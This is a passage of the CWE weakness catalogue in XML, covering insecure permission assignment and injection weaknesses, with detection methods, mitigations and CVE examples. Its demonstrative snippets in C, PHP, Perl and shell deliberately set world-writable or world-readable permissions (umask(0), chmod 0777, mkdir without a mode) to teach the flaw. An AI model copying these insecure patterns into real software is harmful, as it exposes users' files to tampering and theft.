               <Effectiveness_Notes>These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.</Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis</Method>
               <Description>Manual static analysis may be effective in detecting the use of custom permissions models and functions. The code could then be examined to identifying usage of the related functions. Then the human analyst could evaluate permission assignments in the context of the intended security model of the software.</Description>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Dynamic Analysis</Method>
               <Description>Manual dynamic analysis may be effective in detecting the use of custom permissions models and functions. The program could then be executed with a focus on exercising code paths that are related to the custom permissions. Then the human analyst could evaluate permission assignments in the context of the intended security model of the software.</Description>
            </Detection_Method>
            <Detection_Method>
               <Method>Fuzzing</Method>
               <Description>Fuzzing is not effective in detecting this weakness.</Description>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-11.1">
               <Method>Black Box</Method>
               <Description>
                  <xhtml:p>Use monitoring tools that examine the software's process as it interacts with the operating system and the network. This technique is useful in cases when source code is unavailable, if the software was not developed by you, or if you want to verify that the build phase did not introduce any new weaknesses. Examples include debuggers that directly attach to the running process; system-call tracing utilities such as truss (Solaris) and strace (Linux); system activity monitors such as FileMon, RegMon, Process Monitor, and other Sysinternals utilities (Windows); and sniffers and protocol analyzers that monitor network traffic.</xhtml:p>
                  <xhtml:p>Attach the monitor to the process and watch for library functions or system calls on OS resources such as files, directories, and shared memory. Examine the arguments to these calls to infer which permissions are being used.</xhtml:p>
               </Description>
               <Effectiveness_Notes>Note that this technique is only useful for permissions issues related to system resources. It is not likely to detect application-level business rules that are related to permissions, such as if a user of a blog system marks a post as "private," but the blog system inadvertently marks it as "public."</Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Inter-application Flow Analysis</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Host-based Vulnerability Scanners – Examine configuration for flaws, verifying that audit mechanisms work, ensure host configuration meets certain predefined criteria</xhtml:li>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                           <xhtml:li>Web Services Scanner</xhtml:li>
                           <xhtml:li>Database Scanners</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Host Application Interface Scanner</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Fuzz Tester</xhtml:li>
                           <xhtml:li>Framework-based Fuzzer</xhtml:li>
                           <xhtml:li>Automated Monitored Execution</xhtml:li>
                           <xhtml:li>Forced Path Execution</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Configuration Checker</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>When using a critical resource such as a configuration file, check to see if the resource has insecure permissions (such as being modifiable by any regular user) [REF-62], and generate an error or even exit the software if there is a possibility that the resource could have been modified by an unauthorized party.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Divide the software into anonymous, normal, privileged, and administrative areas. Reduce the attack surface by carefully defining distinct user groups, privileges, and/or roles. Map these against data, functionality, and the related resources. Then set the permissions accordingly. This will allow you to maintain more fine-grained control over your resources. [REF-207]</Description>
               <Effectiveness>Moderate</Effectiveness>
               <Effectiveness_Notes>This can be an effective strategy. However, in practice, it may be difficult or time consuming to define these areas when there are many different resources or user types, or if the applications features change rapidly.</Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-22">
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Strategy>Sandbox or Jail</Strategy>
               <Description>
                  <xhtml:p>Run the code in a "jail" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.</xhtml:p>
                  <xhtml:p>OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.</xhtml:p>
                  <xhtml:p>This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.</xhtml:p>
                  <xhtml:p>Be careful to avoid CWE-243 and other weaknesses related to jails.</xhtml:p>
               </Description>
               <Effectiveness>Limited</Effectiveness>
               <Effectiveness_Notes>The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed.</Effectiveness_Notes>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Phase>Installation</Phase>
               <Description>During program startup, explicitly set the default permissions or umask to the most restrictive setting possible. Also set the appropriate permissions during program installation. This will prevent you from inheriting insecure permissions from any user who installs or runs the program.</Description>
               <Effectiveness>High</Effectiveness>
            </Mitigation>
            <Mitigation>
               <Phase>System Configuration</Phase>
               <Description>For all configuration files, executables, and libraries, make sure that they are only readable and writable by the software's administrator.</Description>
               <Effectiveness>High</Effectiveness>
            </Mitigation>
            <Mitigation>
               <Phase>Documentation</Phase>
               <Description>Do not suggest insecure configuration changes in documentation, especially if those configurations can extend to resources and other programs that are outside the scope of the application.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Installation</Phase>
               <Description>Do not assume that a system administrator will manually change the configuration to the settings that are recommended in the software's manual.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-37">
               <Phase>Operation</Phase>
               <Phase>System Configuration</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>Ensure that the software runs properly under the Federal Desktop Core Configuration (FDCC) [REF-199] or an equivalent hardening configuration guide, which many organizations use to limit the attack surface and potential risk of deployed software.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following code sets the umask of the process to 0 before creating a file and writing "Hello world" into the file.</Intro_Text>
               <Example_Code Nature="bad" Language="C">
                  <xhtml:div>#define OUTFILE "hello.out"<xhtml:br/>
                     <xhtml:br/>umask(0);<xhtml:br/>FILE *out;<xhtml:br/>
                     <xhtml:i>/* Ignore CWE-59 (link following) for brevity */</xhtml:i>
                     <xhtml:br/>
                     <xhtml:br/>out = fopen(OUTFILE, "w");<xhtml:br/>if (out) {<xhtml:div style="margin-left:10px;">fprintf(out, "hello world!\n");<xhtml:br/>fclose(out);</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>After running this program on a UNIX system, running the "ls -l" command might return the following output:</Body_Text>
               <Example_Code Nature="result">
                  <xhtml:div>-rw-rw-rw- 1 username 13 Nov 24 17:58 hello.out</xhtml:div>
               </Example_Code>
               <Body_Text>The "rw-rw-rw-" string indicates that the owner, group, and world (all users) can read the file and write to it.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>This code creates a home directory for a new user, and makes that user the owner of the directory. If the new directory cannot be owned by the user, the directory is deleted.</Intro_Text>
               <Example_Code Nature="bad" Language="PHP">
                  <xhtml:div>function createUserDir($username){<xhtml:div style="margin-left:10px;">$path = '/home/'.$username;<xhtml:br/>if(!mkdir($path)){<xhtml:div style="margin-left:10px;">return false;</xhtml:div>}<xhtml:br/>if(!chown($path,$username)){<xhtml:div style="margin-left:10px;">rmdir($path);<xhtml:br/>return false;</xhtml:div>}<xhtml:br/>return true;</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>Because the optional "mode" argument is omitted from the call to mkdir(), the directory is created with the default permissions 0777. Simply setting the new user as the owner of the directory does not explicitly change the permissions of the directory, leaving it with the default. This default allows any user to read and write to the directory, allowing an attack on the user's files. The code also fails to change the owner group of the directory, which may result in access by unexpected groups.</Body_Text>
               <Body_Text>This code may also be vulnerable to Path Traversal (CWE-22) attacks if an attacker supplies a non alphanumeric username.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following code snippet might be used as a monitor to periodically record whether a web site is alive. To ensure that the file can always be modified, the code uses chmod() to make the file world-writable.</Intro_Text>
               <Example_Code Nature="bad" Language="Perl">
                  <xhtml:div>$fileName = "secretFile.out";<xhtml:br/>
                     <xhtml:br/>if (-e $fileName) {<xhtml:div style="margin-left:10px;">chmod 0777, $fileName;</xhtml:div>}<xhtml:br/>
                     <xhtml:br/>my $outFH;<xhtml:br/>if (! open($outFH, "&gt;&gt;$fileName")) {<xhtml:div style="margin-left:10px;">ExitError("Couldn't append to $fileName: $!");</xhtml:div>}<xhtml:br/>my $dateString = FormatCurrentTime();<xhtml:br/>my $status = IsHostAlive("cwe.mitre.org");<xhtml:br/>print $outFH "$dateString cwe status: $status!\n";<xhtml:br/>close($outFH);</xhtml:div>
               </Example_Code>
               <Body_Text>The first time the program runs, it might create a new file that inherits the permissions from its environment. A file listing might look like:</Body_Text>
               <Example_Code Nature="result">
                  <xhtml:div>-rw-r--r-- 1 username 13 Nov 24 17:58 secretFile.out</xhtml:div>
               </Example_Code>
               <Body_Text>This listing might occur when the user has a default umask of 022, which is a common setting. Depending on the nature of the file, the user might not have intended to make it readable by everyone on the system.</Body_Text>
               <Body_Text>The next time the program runs, however - and all subsequent executions - the chmod will set the file's permissions so that the owner, group, and world (all users) can read the file and write to it:</Body_Text>
               <Example_Code Nature="result">
                  <xhtml:div>-rw-rw-rw- 1 username 13 Nov 24 17:58 secretFile.out</xhtml:div>
               </Example_Code>
               <Body_Text>Perhaps the programmer tried to do this because a different process uses different permissions that might prevent the file from being updated.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following command recursively sets world-readable permissions for a directory and all of its children:</Intro_Text>
               <Example_Code Nature="bad" Language="Shell">
                  <xhtml:div>chmod -R ugo+r DIRNAME</xhtml:div>
               </Example_Code>
               <Body_Text>If this command is run from a program, the person calling the program might not expect that all the files under the directory will be world-readable. If the directory is expected to contain private data, this could become a security problem.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2009-3482</Reference>
               <Description>Anti-virus product sets insecure "Everyone: Full Control" permissions for files under the "Program Files" folder, allowing attackers to replace executables with Trojan horses.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3482</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3897</Reference>
               <Description>Product creates directories with 0777 permissions at installation, allowing users to gain privileges and access a socket used for authentication.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3897</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3489</Reference>
               <Description>Photo editor installs a service with an insecure security descriptor, allowing users to stop or start the service, or execute commands as SYSTEM.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3489</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3289</Reference>
               <Description>Library function copies a file to a new target and uses the source file's permissions for the target, which is incorrect when the source file is a symbolic link, which typically has 0777 permissions.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3289</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-0115</Reference>
               <Description>Device driver uses world-writable permissions for a socket file, allowing attackers to inject arbitrary commands.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0115</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-1073</Reference>
               <Description>LDAP server stores a cleartext password in a world-readable file.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1073</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-0141</Reference>
               <Description>Terminal emulator creates TTY devices with world-writable permissions, allowing an attacker to write to the terminals of other users.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0141</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-0662</Reference>
               <Description>VPN product stores user credentials in a registry key with "Everyone: Full Control" permissions, allowing attackers to steal the credentials.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0662</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-0322</Reference>
               <Description>Driver installs its device interface with "Everyone: Write" permissions.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0322</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3939</Reference>
               <Description>Driver installs a file with world-writable permissions.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3939</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3611</Reference>
               <Description>Product changes permissions to 0777 before deleting a backup; the permissions stay insecure for subsequent backups.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3611</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-6033</Reference>
               <Description>Product creates a share with "Everyone: Full Control" permissions, allowing arbitrary program execution.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6033</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-5544</Reference>
               <Description>Product uses "Everyone: Full Control" permissions for memory-mapped files (shared memory) in inter-process communication, allowing attackers to tamper with a session.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-5544</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-4868</Reference>
               <Description>Database product uses read/write permissions for everyone for its shared memory, allowing theft of credentials.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-4868</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-1714</Reference>
               <Description>Security product uses "Everyone: Full Control" permissions for its configuration files.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-1714</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-0006</Reference>
               <Description>"Everyone: Full Control" permissions assigned to a mutex allows users to disable network connectivity.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0006</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-0969</Reference>
               <Description>Chain: database product contains buffer overflow that is only reachable through a .ini configuration file - which has "Everyone: Full Control" permissions.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0969</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>FIO03-J</Entry_ID>
               <Entry_Name>Create files with appropriate access permission</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>SEC01-J</Entry_ID>
               <Entry_Name>Do not allow tainted variables in privileged blocks</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>ENV03-J</Entry_ID>
               <Entry_Name>Do not grant dangerous combinations of permissions</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>FIO06-C</Entry_ID>
               <Entry_Name>Create files with appropriate access permissions</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="1"/>
            <Related_Attack_Pattern CAPEC_ID="122"/>
            <Related_Attack_Pattern CAPEC_ID="127"/>
            <Related_Attack_Pattern CAPEC_ID="17"/>
            <Related_Attack_Pattern CAPEC_ID="180"/>
            <Related_Attack_Pattern CAPEC_ID="206"/>
            <Related_Attack_Pattern CAPEC_ID="234"/>
            <Related_Attack_Pattern CAPEC_ID="60"/>
            <Related_Attack_Pattern CAPEC_ID="61"/>
            <Related_Attack_Pattern CAPEC_ID="62"/>
            <Related_Attack_Pattern CAPEC_ID="642"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-62" Section="Chapter 9, &#34;File Permissions.&#34; Page 495"/>
            <Reference External_Reference_ID="REF-207" Section="Chapter 8, &#34;Access Control.&#34; Page 194"/>
            <Reference External_Reference_ID="REF-594"/>
            <Reference External_Reference_ID="REF-199"/>
         </References>
         <Notes>
            <Note Type="Maintenance">The relationships between privileges, permissions, and actors (e.g. users and groups) need further refinement within the Research view. One complication is that these concepts apply to two different pillars, related to control of resources (CWE-664) and protection mechanism failures (CWE-396).</Note>
         </Notes>
         
      </Weakness>
      <Weakness ID="74" Name="Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')" Abstraction="Class" Structure="Simple" Status="Incomplete">
         <Description>The software constructs all or part of a command, data structure, or record using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify how it is parsed or interpreted when it is sent to a downstream component.</Description>
         <Extended_Description>Software has certain assumptions about what constitutes data and control respectively. It is the lack of verification of these assumptions for user-controlled input that leads to injection problems. Injection problems encompass a wide variety of issues -- all mitigated in very different ways and usually attempted in order to alter the control flow of the process. For this reason, the most effective way to discuss these weaknesses is to note the distinct features which classify them as injection weaknesses. The most important issue to note is that all injection problems share one thing in common -- i.e., they allow for the injection of control plane data into the user-controlled data plane. This means that the execution of the process may be altered by sending code in through legitimate data channels, using no other mechanism. While buffer overflows, and many other flaws, involve the use of some further issue to gain execution, injection problems need only for the data to be parsed. The most classic instantiations of this category of weakness are SQL injection and format string vulnerabilities.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="707" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="116" View_ID="699" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="20" View_ID="699"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Note>Many injection attacks involve the disclosure of important information -- in terms of both data sensitivity and usefulness in further exploitation.</Note>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Note>In some cases, injectable code controls authentication; this may lead to a remote vulnerability.</Note>
            </Consequence>
            <Consequence>
               <Scope>Other</Scope>
               <Impact>Alter Execution Logic</Impact>
               <Note>Injection attacks are characterized by the ability to significantly change the flow of a given process, and in some cases, to the execution of arbitrary code.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Other</Scope>
               <Impact>Other</Impact>
               <Note>Data injection attacks lead to loss of data integrity in nearly all cases as the control-plane data injected is always incidental to data recall or writing.</Note>
            </Consequence>
            <Consequence>
               <Scope>Non-Repudiation</Scope>
               <Impact>Hide Activities</Impact>
               <Note>Often the actions performed by injected control code are unlogged.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Requirements</Phase>
               <Description>Programming languages and supporting technologies might be chosen which are not subject to these issues.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Utilize an appropriate mix of whitelist and blacklist parsing to filter control-plane syntax from all input.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="CLASP">
               <Entry_Name>Injection problem ('data' used as something else)</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A6</Entry_ID>
               <Entry_Name>Injection Flaws</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP24</Entry_ID>
               <Entry_Name>Tainted input to command</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="10"/>
            <Related_Attack_Pattern CAPEC_ID="101"/>
            <Related_Attack_Pattern CAPEC_ID="108"/>
            <Related_Attack_Pattern CAPEC_ID="120"/>
            <Related_Attack_Pattern CAPEC_ID="13"/>
            <Related_Attack_Pattern CAPEC_ID="135"/>
            <Related_Attack_Pattern CAPEC_ID="14"/>
            <Related_Attack_Pattern CAPEC_ID="24"/>
            <Related_Attack_Pattern CAPEC_ID="250"/>
            <Related_Attack_Pattern CAPEC_ID="267"/>
            <Related_Attack_Pattern CAPEC_ID="273"/>
            <Related_Attack_Pattern CAPEC_ID="28"/>
            <Related_Attack_Pattern CAPEC_ID="3"/>
            <Related_Attack_Pattern CAPEC_ID="34"/>
            <Related_Attack_Pattern CAPEC_ID="42"/>
            <Related_Attack_Pattern CAPEC_ID="43"/>
            <Related_Attack_Pattern CAPEC_ID="45"/>
            <Related_Attack_Pattern CAPEC_ID="46"/>
            <Related_Attack_Pattern CAPEC_ID="47"/>
            <Related_Attack_Pattern CAPEC_ID="51"/>
            <Related_Attack_Pattern CAPEC_ID="52"/>
            <Related_Attack_Pattern CAPEC_ID="53"/>
            <Related_Attack_Pattern CAPEC_ID="6"/>
            <Related_Attack_Pattern CAPEC_ID="64"/>
            <Related_Attack_Pattern CAPEC_ID="66"/>
            <Related_Attack_Pattern CAPEC_ID="67"/>
            <Related_Attack_Pattern CAPEC_ID="7"/>
            <Related_Attack_Pattern CAPEC_ID="71"/>
            <Related_Attack_Pattern CAPEC_ID="72"/>
            <Related_Attack_Pattern CAPEC_ID="76"/>
            <Related_Attack_Pattern CAPEC_ID="78"/>
            <Related_Attack_Pattern CAPEC_ID="79"/>
            <Related_Attack_Pattern CAPEC_ID="8"/>
            <Related_Attack_Pattern CAPEC_ID="80"/>
            <Related_Attack_Pattern CAPEC_ID="83"/>
            <Related_Attack_Pattern CAPEC_ID="84"/>
            <Related_Attack_Pattern CAPEC_ID="9"/>
         </Related_Attack_Patterns>
         <Notes>
            <Note Type="Relationship">In the development view (CWE-699), this is classified as an Input Validation problem (CWE-20) because many people do not distinguish between the consequence/attack (injection) and the protection mechanism that prevents the attack from succeeding. In the research view (CWE-1000), however, input validation is only one potential protection mechanism (output encoding is another), and there is a chaining relationship between improper input validation and the improper enforcement of the structure of messages to other components. Other issues not directly related to input validation, such as race conditions, could similarly impact message structure.</Note>
         </Notes>
         
      </Weakness>
      <Weakness ID="75" Name="Failure to Sanitize Special Elements into a Different Plane (Special Element Injection)" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The software does not adequately filter user-controlled input for special elements with control implications.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="699" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Impact>Modify Application Data</Impact>
               <Impact>Execute Unauthorized Code or Commands</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Requirements</Phase>
               <Description>Programming languages and supporting technologies might be chosen which are not subject to these issues.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Utilize an appropriate mix of whitelist and blacklist parsing to filter special element syntax from all input.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Special Element Injection</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="81"/>
            <Related_Attack_Pattern CAPEC_ID="93"/>
         </Related_Attack_Patterns>
         
      </Weakness>
      <Weakness ID="754" Name="Improper Check for Unusual or Exceptional Conditions" Abstraction="Class" Structure="Simple" Status="Incomplete">
         <Description>The software does not check or incorrectly checks for unusual or exceptional conditions that are not expected to occur frequently during day to day operation of the software.</Description>
         <Extended_Description>
